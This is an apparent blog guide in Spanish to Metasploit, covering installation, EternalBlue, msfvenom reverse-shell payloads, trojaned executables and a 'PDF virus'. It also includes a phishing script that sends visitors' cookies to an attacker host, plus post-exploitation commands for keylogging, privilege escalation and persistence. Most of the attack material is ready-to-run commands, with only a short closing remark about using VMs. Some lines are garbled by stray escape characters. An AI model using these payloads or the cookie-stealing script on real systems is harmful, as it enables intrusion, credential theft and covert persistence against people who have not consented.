Metasploit: Directo al código – Guía Práctica

Esta guía en Markdown recopila de forma íntegra los puntos desarrollados, con ejemplos claros para tu blog.

1. Instalación de Metasploit

Descripción: Cómo descargar e instalar Metasploit Framework en Windows.

Ejemplo paso a paso:

# 1. Descargar el instalador desde el sitio oficial
# 2. Ejecutar Metasploit-latest-windows-installer.exe y seguir el asistente

# 3. Verificar que msfconsole esté accesible:
C:\> msfconsole --version
# Framework Version: 6.2.0-dev

Tras la instalación, msfconsole.bat queda en C:\metasploit-framework\.

2. Configuración y fundamentos

Descripción: Poner en marcha la base de datos y aprender los comandos básicos.

# Iniciar el servicio de PostgreSQL
C:\> net start postgresql

# Entrar en msfconsole y comprobar conexión a la base de datos:
C:\> msfconsole
msf6 > db_status
[*] postgresql connected to msf

# Comandos básicos:
msf6 > help               # Listar opciones\ nmsf6 > search smb         # Buscar módulos SMB
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > show options

3. Exploits y Payloads

Descripción: Tipos de exploits, payloads y generación con msfvenom.

# Generar ejecutable .exe con Meterpreter inverso
msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST=192.168.1.10 LPORT=4444 \
        -f exe -o shell.exe

# Configurar handler en msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.10
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > run

Al ejecutar shell.exe, obtendrás una sesión Meterpreter:

[*] Meterpreter session 1 opened (192.168.1.10:4444 → 192.168.1.20:1234)

4. Recopilación de información

Descripción: Escaneo de puertos y detección de vulnerabilidades con Nmap y Nessus.

# Escaneo rápido de puertos TCP
msf6 > db_nmap -sT -p 1-1000 192.168.1.0/24

# Escaneo con scripts de vulnerabilidad
msf6 > db_nmap -sV --script vuln 192.168.1.105

Ver resultados:

msf6 > hosts    # Hosts descubiertos
msf6 > services # Servicios y puertos
msf6 > vulns    # Vulnerabilidades detectadas

Para importar un informe de Nessus:

msf6 > db_import /ruta/a/nessus_report.xml

5. Ataques del lado del cliente

Descripción: Generar troyanos y documentos maliciosos.

# Backdoor Linux x86\ nmsfvenom -p linux/x86/meterpreter/reverse_tcp \
        LHOST=10.0.0.5 LPORT=5555 \
        -f elf -o backdoor.elf

# Virus PDF para Windows
msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST=10.0.0.5 LPORT=5555 \
        -f pdf -o doc_infectado.pdf

Phishing: clona la página, añade un <script> para capturar cookies:

<script>
  new Image().src = "http://10.0.0.5:8080/collect?cookie=" + document.cookie;
</script>

6. Post-explotación

Descripción: Escalada de privilegios, recolección y persistencia.

# Información del sistema
meterpreter > sysinfo

# Subir/descargar ficheros
meterpreter > upload local_tool.exe C:\Windows\Temp\tool.exe
meterpreter > download C:\Ruta\log.txt ./log.txt

# Captura de pantalla\ nmeterpreter > screenshot

# Búsqueda de archivos
meterpreter > search -f *.docx

# Escalada de privilegios\ nmeterpreter > run post/windows/escalate/getsystem

# Keylogging\ nmeterpreter > keylog_start

# Persistencia\ nmeterpreter > run persistence -U -i 10 -p 4444 -r 10.0.0.5

7. Uso avanzado de Metasploit

Descripción: Ocultar payloads y usar Armitage.

# Injertar payload en ejecutable legítimo
msfvenom -x original.exe \
         -p windows/meterpreter/reverse_tcp \
         LHOST=10.0.0.5 LPORT=4444 \
         -k -f exe -o modificado.exe

Armitage:

Inicia PostgreSQL y Metasploit.

Ejecuta armitage.

Conecta y añade hosts con la GUI.

8. Recomendaciones finales

Aísla tus pruebas en VM.

Actualiza Metasploit periódicamente:

msf6 > msfupdate

Documenta cada paso.

Consulta la documentación oficial de Metasploit.

Explora módulos en GitHub: metasploit-framework/modules.

